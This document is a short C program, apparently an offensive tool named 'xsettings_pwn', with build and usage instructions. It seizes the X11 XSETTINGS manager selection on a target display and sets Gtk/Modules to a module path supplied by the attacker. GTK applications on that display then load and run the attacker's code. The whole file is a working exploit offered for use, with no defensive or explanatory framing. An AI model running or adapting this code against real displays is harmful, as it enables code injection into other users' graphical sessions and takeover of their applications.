/* Minimal XSETTINGS manager: owns _XSETTINGS_S0 and sets Gtk/Modules.
 * Usage: xsettings_pwn <display> <module-path>
 * Build: gcc -O2 -o xsettings_pwn xsettings_pwn.c -lX11
 */
#include <X11/Xlib.h>
#include <X11/Xatom.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

static void emit32(unsigned char **p, uint32_t v) {
    *(*p)++ = v; *(*p)++ = v >> 8; *(*p)++ = v >> 16; *(*p)++ = v >> 24;
}
static void emit16(unsigned char **p, uint16_t v) {
    *(*p)++ = v; *(*p)++ = v >> 8;
}
static size_t pad4(size_t n) { return (4 - (n % 4)) % 4; }

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "usage: %s DISPLAY MODULE\n", argv[0]);
        return 1;
    }
    Display *d = XOpenDisplay(argv[1]);
    if (!d) { fprintf(stderr, "cannot open display %s\n", argv[1]); return 1; }
    int screen = DefaultScreen(d);
    Window root = RootWindow(d, screen);
    Window win = XCreateSimpleWindow(d, root, -1, -1, 1, 1, 0, 0, 0);
    XStoreName(d, win, "xsettings-pwn");

    Atom prop = XInternAtom(d, "_XSETTINGS_SETTINGS", False);
    Atom sel = XInternAtom(d, "_XSETTINGS_S0", False);
    Atom manager = XInternAtom(d, "MANAGER", False);

    const char *name = "Gtk/Modules";
    const char *value = argv[2];
    size_t nlen = strlen(name), vlen = strlen(value);
    unsigned char buf[256];
    unsigned char *p = buf;
    *p++ = 0;                     /* LSBFirst */
    *p++ = 0; *p++ = 0; *p++ = 0;
    emit32(&p, 1);                /* serial */
    emit32(&p, 1);                /* one setting */
    *p++ = 1;                     /* string */
    *p++ = 0;
    emit16(&p, nlen);
    memcpy(p, name, nlen); p += nlen;
    memset(p, 0, pad4(nlen)); p += pad4(nlen);
    emit32(&p, 1);                /* last change */
    emit32(&p, vlen);
    memcpy(p, value, vlen); p += vlen;
    memset(p, 0, pad4(vlen)); p += pad4(vlen);

    XChangeProperty(d, win, prop, prop, 8, PropModeReplace, buf, p - buf);

    XGrabServer(d);
    Window prev = XGetSelectionOwner(d, sel);
    XSetSelectionOwner(d, sel, win, CurrentTime);
    if (XGetSelectionOwner(d, sel) != win) {
        fprintf(stderr, "failed to own %s\n", XGetAtomName(d, sel));
        XUngrabServer(d);
        return 1;
    }
    XUngrabServer(d);

    if (prev) {
        XEvent ev;
        XSelectInput(d, prev, StructureNotifyMask);
        XWindowEvent(d, prev, StructureNotifyMask, &ev);
    }

    XEvent ev;
    memset(&ev, 0, sizeof(ev));
    ev.xclient.type = ClientMessage;
    ev.xclient.window = root;
    ev.xclient.message_type = manager;
    ev.xclient.format = 32;
    ev.xclient.data.l[0] = CurrentTime;
    ev.xclient.data.l[1] = sel;
    ev.xclient.data.l[2] = win;
    XSendEvent(d, root, False, StructureNotifyMask, &ev);
    XSync(d, False);

    fprintf(stderr, "xsettings_pwn: %s -> %s (window 0x%lx)\n",
            name, value, (unsigned long)win);
    for (;;) pause();
    return 0;
}
